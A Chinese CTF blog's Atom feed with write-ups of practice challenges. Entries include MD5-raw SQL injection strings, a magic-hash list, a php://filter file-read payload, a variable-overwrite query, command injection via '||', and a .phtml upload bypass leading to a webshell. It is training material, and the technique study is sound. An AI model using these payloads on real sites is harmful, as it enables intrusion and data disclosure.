<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Da4er&#39;s Blogs</title>
  
  <subtitle>学而专，专而精。</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://da4er.top/"/>
  <updated>2020-02-11T07:13:17.960Z</updated>
  <id>https://da4er.top/</id>
  
  <author>
    <name>Da4er&#39;s</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>2.11 [BJDCTF2020]Easy MD5&amp;Mark loves cat</title>
    <link href="https://da4er.top/2-11-BJDCTF2020-Easy-MD5-Mark-loves-cat.html"/>
    <id>https://da4er.top/2-11-BJDCTF2020-Easy-MD5-Mark-loves-cat.html</id>
    <published>2020-02-11T07:11:05.000Z</published>
    <updated>2020-02-11T07:13:17.960Z</updated>
    
    <content type="html"><![CDATA[<p><script type="text/javascript" src="/js/src/bai.js"></script><br><strong>首先打开页面，在输入框随便输入发现没有跳转，f12查看后台文件中发现hint</strong><br><img src="/2-11-BJDCTF2020-Easy-MD5-Mark-loves-cat/1.png" class title="Da4er"><br><strong>md5($pass,true)第二个参数默认是false<br>FALSE - 默认 32 字符十六进制数<br>TRUE -  原始 16 字符二进制格式。<br>所以当输入特殊字符串时在经md5加密后可能出现注入语句。<br>在上网百度后发现两个特殊字符：’ffifdyop’，’129581926211651571912466741651878684928’。<br>ffifdyop：T0Do#’or’8<br>129581926211651571912466741651878684928：’or’6]!r,b。<br>所以直接输入ffifdyop，转到第二页面。</strong><br><img src="/2-11-BJDCTF2020-Easy-MD5-Mark-loves-cat/2.png" class title="Da4er"><br><img src="/2-11-BJDCTF2020-Easy-MD5-Mark-loves-cat/3.png" class title="Da4er"><br><strong>查看源代码后发现是md5弱类型比较。下面给出的字符串随便找两个传参即可：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line">找md5以oe开头的</span><br><span class="line">常用的md5：</span><br><span class="line">QNKCDZO</span><br><span class="line">0e830400451993494058024219903391</span><br><span class="line"></span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line"></span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line"></span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line"></span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line"></span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line"></span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line"></span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line"></span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line"></span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line"></span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line"></span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line"></span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line"></span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line"></span><br><span class="line">s1184209335a</span><br><span class="line">0e072485820392773389523109082030</span><br><span class="line"></span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line"></span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line"></span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line"></span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line"></span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line"></span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line"></span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line"></span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line"></span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line"></span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line"></span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line"></span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line"></span><br><span class="line">s532378020a</span><br><span class="line">0e220463095855511507588041205815</span><br><span class="line"></span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line"></span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line"></span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line"></span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line"></span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line"></span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line"></span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line"></span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line"></span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line"></span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br></pre></td></tr></table></figure><br><strong>传参后跳转最后一个页面：</strong><br><img src="/2-11-BJDCTF2020-Easy-MD5-Mark-loves-cat/4.png" class title="Da4er"><br><strong>发现是===完全等于，可以利用[]数组绕过，利用error=error原理，得到flag。</strong><br><img src="/2-11-BJDCTF2020-Easy-MD5-Mark-loves-cat/5.png" class title="Da4er"></p><hr><p><strong>打开网站随便看看，发现没有什么特别，用dirsearch扫描一下，发现/.git目录，用githack获取一下源码。</strong><br><img src="/2-11-BJDCTF2020-Easy-MD5-Mark-loves-cat/6.png" class title="Da4er"><br><img src="/2-11-BJDCTF2020-Easy-MD5-Mark-loves-cat/7.png" class title="Da4er"><br><strong>分析得到的源码：</strong><br><img src="/2-11-BJDCTF2020-Easy-MD5-Mark-loves-cat/8.png" class title="Da4er"><br><img src="/2-11-BJDCTF2020-Easy-MD5-Mark-loves-cat/9.png" class title="Da4er"><br><strong>看到使用的$$会导致变量覆盖漏洞，看一下代码逻辑：forsearch一下post传参的参数键名和值：如果传入$flag=flag，则会导致$$flag=$flag；同理get参数：传入yds=flag，则会导致$yds=$flag，所以yds的值就是flag变量的值。在没有设置flag参数的时候会直接exit出yds的值。</strong><br>根据上面的逻辑可以直接构造：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get传参：?yds&#x3D;flag</span><br></pre></td></tr></table></figure><br><img src="/2-11-BJDCTF2020-Easy-MD5-Mark-loves-cat/10.png" class title="Da4er"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/bai.js&quot;&gt;&lt;/script&gt;&lt;br&gt;&lt;strong&gt;首先打开页面，在输入框随便输入发现没有跳转，f12查看后台文件中发现hint&lt;/strong&gt;&lt;br&gt;&lt;img src=&quot;/2-
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://da4er.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://da4er.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>2.11 [GUET-CTF2019]soul sipse</title>
    <link href="https://da4er.top/2-11-GUET-CTF2019-soul-sipse.html"/>
    <id>https://da4er.top/2-11-GUET-CTF2019-soul-sipse.html</id>
    <published>2020-02-11T04:46:04.000Z</published>
    <updated>2020-02-11T04:47:00.686Z</updated>
    
    <content type="html"><![CDATA[<p><script type="text/javascript" src="/js/src/bai.js"></script><br><strong>用Audacity打开在频谱图发现：</strong><br><img src="/2-11-GUET-CTF2019-soul-sipse/6.png" class title="Da4er"><br><strong>再用steghide将隐藏的文件找出来</strong><br><img src="/2-11-GUET-CTF2019-soul-sipse/7.png" class title="Da4er"><br><img src="/2-11-GUET-CTF2019-soul-sipse/8.png" class title="Da4er"><br><strong>最后unicode解码一下</strong><br><img src="/2-11-GUET-CTF2019-soul-sipse/9.png" class title="Da4er"><br><strong>得到flag{5304}</strong></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/bai.js&quot;&gt;&lt;/script&gt;&lt;br&gt;&lt;strong&gt;用Audacity打开在频谱图发现：&lt;/strong&gt;&lt;br&gt;&lt;img src=&quot;/2-11-GUET-CTF2019-soul
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://da4er.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://da4er.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>2.11 [GUET-CTF2019]虚假的压缩包</title>
    <link href="https://da4er.top/2-11-GUET-CTF2019-%E8%99%9A%E5%81%87%E7%9A%84%E5%8E%8B%E7%BC%A9%E5%8C%85.html"/>
    <id>https://da4er.top/2-11-GUET-CTF2019-%E8%99%9A%E5%81%87%E7%9A%84%E5%8E%8B%E7%BC%A9%E5%8C%85.html</id>
    <published>2020-02-11T04:44:09.000Z</published>
    <updated>2020-02-11T04:45:22.647Z</updated>
    
    <content type="html"><![CDATA[<p><script type="text/javascript" src="/js/src/bai.js"></script><br><strong>首先拿到题目，有一个虚假的压缩包和真实的压缩包</strong><br><strong>很明显虚假的压缩包是伪加密</strong><br><img src="/2-11-GUET-CTF2019-%E8%99%9A%E5%81%87%E7%9A%84%E5%8E%8B%E7%BC%A9%E5%8C%85/1.png" class title="Da4er"><br><strong>打开压缩包后发现是解rsa</strong><br><img src="/2-11-GUET-CTF2019-%E8%99%9A%E5%81%87%E7%9A%84%E5%8E%8B%E7%BC%A9%E5%8C%85/2.png" class title="Da4er"><br><strong>有n，e，c是个简单的rsa，直接脚本一把梭</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import libnum</span><br><span class="line">from Crypto.Util.number import long_to_bytes</span><br><span class="line"></span><br><span class="line">c &#x3D; 26</span><br><span class="line">n &#x3D; 33</span><br><span class="line">e &#x3D; 0x3</span><br><span class="line">q &#x3D; 11</span><br><span class="line">p &#x3D; 13</span><br><span class="line"></span><br><span class="line">d &#x3D; libnum.invmod(e, (p - 1) * (q - 1))</span><br><span class="line">m &#x3D; pow(c, d, n)</span><br><span class="line">print &quot;m的值为:&quot;</span><br><span class="line">print m</span><br><span class="line">#print long_to_bytes(m)</span><br></pre></td></tr></table></figure><br><strong>得到m为5，可是提示密码不对，这里有个脑洞要加上key.txt前面的”答案是”才是正确的密码，所以真实的压缩包密码为:答案是5。</strong><br><strong>解压后通过修改图片高度</strong><br><img src="/2-11-GUET-CTF2019-%E8%99%9A%E5%81%87%E7%9A%84%E5%8E%8B%E7%BC%A9%E5%8C%85/3.png" class title="Da4er"><br><strong>发现一个将另一个文件的所以和5进行异或</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">with open(&quot;flag&quot;,&quot;r&quot;) as fp:</span><br><span class="line">    r&#x3D;fp.read()</span><br><span class="line">    with open(&quot;xor.txt&quot;,&quot;w&quot;) as fp1:</span><br><span class="line">        for i in r:</span><br><span class="line">            tmp&#x3D;int(i,16)^5</span><br><span class="line">            fp1.write(hex(tmp)[2:])</span><br></pre></td></tr></table></figure><br><strong>得到的是以”504b0304”开头的，将他放到winhex里进行转换acii</strong><br><img src="/2-11-GUET-CTF2019-%E8%99%9A%E5%81%87%E7%9A%84%E5%8E%8B%E7%BC%A9%E5%8C%85/4.png" class title="Da4er"><br><strong>看到是word类型的压缩包，这里的一个知识点：word本身就是个压缩包。所以把zip后缀改成doc，再将字体颜色换成深色，得到flag。</strong><br><img src="/2-11-GUET-CTF2019-%E8%99%9A%E5%81%87%E7%9A%84%E5%8E%8B%E7%BC%A9%E5%8C%85/5.png" class title="Da4er"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/bai.js&quot;&gt;&lt;/script&gt;&lt;br&gt;&lt;strong&gt;首先拿到题目，有一个虚假的压缩包和真实的压缩包&lt;/strong&gt;&lt;br&gt;&lt;strong&gt;很明显虚假的压缩包是伪加密&lt;/stron
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://da4er.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://da4er.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>2.11 [GUET-CTF2019]zips</title>
    <link href="https://da4er.top/2-11-GUET-CTF2019-zips.html"/>
    <id>https://da4er.top/2-11-GUET-CTF2019-zips.html</id>
    <published>2020-02-11T03:35:20.000Z</published>
    <updated>2020-02-11T03:36:26.791Z</updated>
    
    <content type="html"><![CDATA[<p><script type="text/javascript" src="/js/src/bai.js"></script><br><strong>这道题用到了压缩包：暴力破解，伪加密，掩码攻击等知识点</strong><br><strong>第一步先用暴力破解把222.zip密码找出来</strong><br><img src="/2-11-GUET-CTF2019-zips/1.png" class title="Da4er"><br><strong>第二步看到一个111.zip，里面有个flag.zip和setup.sh，先把flag.zip提出来，再用伪加密把111.zip打开</strong><br><img src="/2-11-GUET-CTF2019-zips/2.png" class title="Da4er"><br><strong>第三步setup.sh的python代码运行查看，发现flag.zip密码规律:15????????.??</strong><br><img src="/2-11-GUET-CTF2019-zips/3.png" class title="Da4er"><br><strong>最后使用掩码攻击的方式得到flag</strong><br><img src="/2-11-GUET-CTF2019-zips/4.png" class title="Da4er"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/bai.js&quot;&gt;&lt;/script&gt;&lt;br&gt;&lt;strong&gt;这道题用到了压缩包：暴力破解，伪加密，掩码攻击等知识点&lt;/strong&gt;&lt;br&gt;&lt;strong&gt;第一步先用暴力破解把222.zi
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://da4er.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://da4er.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>2.10 [ACTF2020 新生赛]Include&amp;BackupFile&amp;Exec&amp;Upload</title>
    <link href="https://da4er.top/2-10-ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Include-BackupFile-Exec-Upload.html"/>
    <id>https://da4er.top/2-10-ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Include-BackupFile-Exec-Upload.html</id>
    <published>2020-02-10T04:32:46.000Z</published>
    <updated>2020-02-10T04:34:21.668Z</updated>
    
    <content type="html"><![CDATA[<p><script type="text/javascript" src="/js/src/bai.js"></script></p><h3 id="Inlcude"><a href="#Inlcude" class="headerlink" title="Inlcude"></a>Inlcude</h3><p><strong>点进去tips发现是file=flag.php，想到php伪协议读取</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure><br><img src="/2-10-ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Include-BackupFile-Exec-Upload/1.png" class title="Da4er"><br><img src="/2-10-ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Include-BackupFile-Exec-Upload/2.png" class title="Da4er"><br><strong>base64解码后得到flag</strong><br><img src="/2-10-ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Include-BackupFile-Exec-Upload/3.png" class title="Da4er"></p><hr><h3 id="BackupFile"><a href="#BackupFile" class="headerlink" title="BackupFile"></a>BackupFile</h3><p><strong>根据题目提示找到备份文件：index.php.bak</strong><br><strong>开始审计这段代码</strong><br><img src="/2-10-ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Include-BackupFile-Exec-Upload/4.png" class title="Da4er"><br><img src="/2-10-ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Include-BackupFile-Exec-Upload/5.png" class title="Da4er"><br>发现用了is_numeric函数，但是php版本是7.3，无法使用数组绕过<br>接着看发现是弱类型比较(==)，并且 <strong>$str在==后面</strong> ，所以整个逻辑就很清楚了。<br>首先传个参数key，检测key是否为数字，然后用intval函数取得key的整数部分，在把str变量和key比较，<strong>这里逻辑要清楚是str变量和key比较，所以str在比较前转换成数字’123’。</strong><br>所以直接让key=123即可<br><img src="/2-10-ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Include-BackupFile-Exec-Upload/6.png" class title="Da4er"></p><hr><h3 id="Exec"><a href="#Exec" class="headerlink" title="Exec"></a>Exec</h3><p><strong>打开网页发现是命令执行（SSRF）</strong><br><img src="/2-10-ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Include-BackupFile-Exec-Upload/7.png" class title="Da4er"><br><strong>并且没有过滤||等关键字</strong><br><img src="/2-10-ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Include-BackupFile-Exec-Upload/8.png" class title="Da4er"><br><strong>直接查看根目录下面的文件</strong><br><img src="/2-10-ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Include-BackupFile-Exec-Upload/9.png" class title="Da4er"><br><strong>看到有个flag文件，cat出来</strong><br><img src="/2-10-ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Include-BackupFile-Exec-Upload/10.png" class title="Da4er"></p><hr><h3 id="Upload"><a href="#Upload" class="headerlink" title="Upload"></a>Upload</h3><p><strong>首先上传一个txt发现当点击submit时会返回chekfile页面</strong><br><img src="/2-10-ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Include-BackupFile-Exec-Upload/11.png" class title="Da4er"><br><strong>将这个js代码删除，再上传。通过试了很多上传方法，发现用大小写绕过，点号绕过，空格绕过但是都不解析。上传.htaccess文件被过滤。但是phtml文件没有被过滤，上传这个文件</strong><br><img src="/2-10-ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Include-BackupFile-Exec-Upload/12.png" class title="Da4er"><br><img src="/2-10-ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Include-BackupFile-Exec-Upload/13.png" class title="Da4er"><br>成功解析<br>连接小马，得到flag。<br><img src="/2-10-ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Include-BackupFile-Exec-Upload/14.png" class title="Da4er"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/bai.js&quot;&gt;&lt;/script&gt;&lt;/p&gt;
&lt;h3 id=&quot;Inlcude&quot;&gt;&lt;a href=&quot;#Inlcude&quot; class=&quot;headerlink&quot; title=&quot;Inlcude&quot;&gt;
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://da4er.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://da4er.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>2.10 BUUCTF Misc_间谍启示录</title>
    <link href="https://da4er.top/2-10-BUUCTF-Misc-%E9%97%B4%E8%B0%8D%E5%90%AF%E7%A4%BA%E5%BD%95.html"/>
    <id>https://da4er.top/2-10-BUUCTF-Misc-%E9%97%B4%E8%B0%8D%E5%90%AF%E7%A4%BA%E5%BD%95.html</id>
    <published>2020-02-10T03:03:34.000Z</published>
    <updated>2020-02-10T03:04:32.344Z</updated>
    
    <content type="html"><![CDATA[<p><script type="text/javascript" src="/js/src/bai.js"></script><br><strong>用winhex打开，发现有个flag.exe</strong><br><img src="/2-10-BUUCTF-Misc-%E9%97%B4%E8%B0%8D%E5%90%AF%E7%A4%BA%E5%BD%95/1.png" class title="Da4er"><br><strong>foremost分离一下，找到flag.exe  strings命令查看一下</strong><br><img src="/2-10-BUUCTF-Misc-%E9%97%B4%E8%B0%8D%E5%90%AF%E7%A4%BA%E5%BD%95/2.png" class title="Da4er"><br><img src="/2-10-BUUCTF-Misc-%E9%97%B4%E8%B0%8D%E5%90%AF%E7%A4%BA%E5%BD%95/3.png" class title="Da4er"><br><strong>有个Flag{，在windows下打开这个exe，发现会创建一个flag.txt，就可以得到flag</strong><br><img src="/2-10-BUUCTF-Misc-%E9%97%B4%E8%B0%8D%E5%90%AF%E7%A4%BA%E5%BD%95/4.png" class title="Da4er"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/bai.js&quot;&gt;&lt;/script&gt;&lt;br&gt;&lt;strong&gt;用winhex打开，发现有个flag.exe&lt;/strong&gt;&lt;br&gt;&lt;img src=&quot;/2-10-BUUCTF-Misc-%
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://da4er.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://da4er.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>2.10 BUUCTF Misc_派大星的烦恼</title>
    <link href="https://da4er.top/2-10-BUUCTF-Misc-%E6%B4%BE%E5%A4%A7%E6%98%9F%E7%9A%84%E7%83%A6%E6%81%BC.html"/>
    <id>https://da4er.top/2-10-BUUCTF-Misc-%E6%B4%BE%E5%A4%A7%E6%98%9F%E7%9A%84%E7%83%A6%E6%81%BC.html</id>
    <published>2020-02-10T02:28:57.000Z</published>
    <updated>2020-02-10T02:29:40.681Z</updated>
    
    <content type="html"><![CDATA[<p><script type="text/javascript" src="/js/src/bai.js"></script><br><strong>用winhex打开，发现题目提示的0x220x44</strong><br><img src="/2-10-BUUCTF-Misc-%E6%B4%BE%E5%A4%A7%E6%98%9F%E7%9A%84%E7%83%A6%E6%81%BC/1.png" class title="Da4er"><br><strong>将”换成0，D换成1，转换成二进制后在转换成文本，出现乱码</strong><br><img src="/2-10-BUUCTF-Misc-%E6%B4%BE%E5%A4%A7%E6%98%9F%E7%9A%84%E7%83%A6%E6%81%BC/2.png" class title="Da4er"><br><img src="/2-10-BUUCTF-Misc-%E6%B4%BE%E5%A4%A7%E6%98%9F%E7%9A%84%E7%83%A6%E6%81%BC/3.png" class title="Da4er"><br><strong>将转换成的二进制翻转后再解码</strong><br><img src="/2-10-BUUCTF-Misc-%E6%B4%BE%E5%A4%A7%E6%98%9F%E7%9A%84%E7%83%A6%E6%81%BC/4.png" class title="Da4er"><br><img src="/2-10-BUUCTF-Misc-%E6%B4%BE%E5%A4%A7%E6%98%9F%E7%9A%84%E7%83%A6%E6%81%BC/5.png" class title="Da4er"><br><strong>得到一串字母和数字，提交发现flag不对，这时我们需要再将这串字符串再翻转一次。</strong><br><img src="/2-10-BUUCTF-Misc-%E6%B4%BE%E5%A4%A7%E6%98%9F%E7%9A%84%E7%83%A6%E6%81%BC/6.png" class title="Da4er"><br><strong>最后得到flag。</strong></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/bai.js&quot;&gt;&lt;/script&gt;&lt;br&gt;&lt;strong&gt;用winhex打开，发现题目提示的0x220x44&lt;/strong&gt;&lt;br&gt;&lt;img src=&quot;/2-10-BUUCTF-Mis
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://da4er.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://da4er.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>2.9 [QCTF2018]picture</title>
    <link href="https://da4er.top/2-9-QCTF2018-picture.html"/>
    <id>https://da4er.top/2-9-QCTF2018-picture.html</id>
    <published>2020-02-09T14:23:07.000Z</published>
    <updated>2020-02-09T14:23:48.212Z</updated>
    
    <content type="html"><![CDATA[<p><script type="text/javascript" src="/js/src/bai.js"></script><br><strong>这道题收获就是得到一个des解密脚本。</strong><br><strong>首先winhex打开发现是png文件</strong><br><img src="/2-9-QCTF2018-picture/1.png" class title="Da4er"><br><strong>经过了许多png隐写的尝试发现是lsb隐写</strong><br><strong>密码为图片中文字的首字母</strong><br><img src="/2-9-QCTF2018-picture/2.png" class title="Da4er"><br><strong>得到一个python脚本，发现是des加密脚本</strong><br><strong>看了别的师傅写的wp发现了一个好用的des解密脚本,然后用这个脚本就可以得到flag</strong><br><img src="/2-9-QCTF2018-picture/3.png" class title="Da4er"><br>解密脚本：<a href="https://github.com/liupengs/DES_Python/blob/master/des.py" target="_blank" rel="noopener">链接</a><br><img src="/2-9-QCTF2018-picture/4.png" class title="Da4er"></p><img src="/2-9-QCTF2018-picture/5.png" class title="Da4er">]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/bai.js&quot;&gt;&lt;/script&gt;&lt;br&gt;&lt;strong&gt;这道题收获就是得到一个des解密脚本。&lt;/strong&gt;&lt;br&gt;&lt;strong&gt;首先winhex打开发现是png文件&lt;/stro
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://da4er.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://da4er.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>2.9 [QCTF2018]Noise</title>
    <link href="https://da4er.top/2-9-QCTF2018-Noise.html"/>
    <id>https://da4er.top/2-9-QCTF2018-Noise.html</id>
    <published>2020-02-09T14:07:00.000Z</published>
    <updated>2020-02-09T14:08:53.629Z</updated>
    
    <content type="html"><![CDATA[<p><script type="text/javascript" src="/js/src/bai.js"></script><br><strong>这道题脑洞比较大，也出现很多新的知识点，以此记录一下。</strong><br>首先题目给了一个wav文件，是《my little pony theme song》。根据题目提示要消除BGM，得到人声。<br>消除BGM的方法：<br><img src="/2-9-QCTF2018-Noise/1.png" class title="Da4er"><br>所以我们要找到原曲，将原曲的相位翻转180度即可。这里使用的软件为：Adobe Audition<br><img src="/2-9-QCTF2018-Noise/2.png" class title="Da4er"><br>得到处理后的文件.wav<br>然后听一下是电信号，这里用到了慢扫描电视的知识点。<br>参考文章：<a href="https://zhuanlan.zhihu.com/p/105460358" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/105460358</a><br>这里使用的是mmsstv工具，首先要先将得到wav录制成mmsstv识别的mmv文件，工具自带了录声音功能。<br>最后得到flag：<br><img src="/2-9-QCTF2018-Noise/3.png" class title="Da4er"></p><p>用到的知识点：<br>怎么去掉BGM<br>慢扫描电视</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/bai.js&quot;&gt;&lt;/script&gt;&lt;br&gt;&lt;strong&gt;这道题脑洞比较大，也出现很多新的知识点，以此记录一下。&lt;/strong&gt;&lt;br&gt;首先题目给了一个wav文件，是《my littl
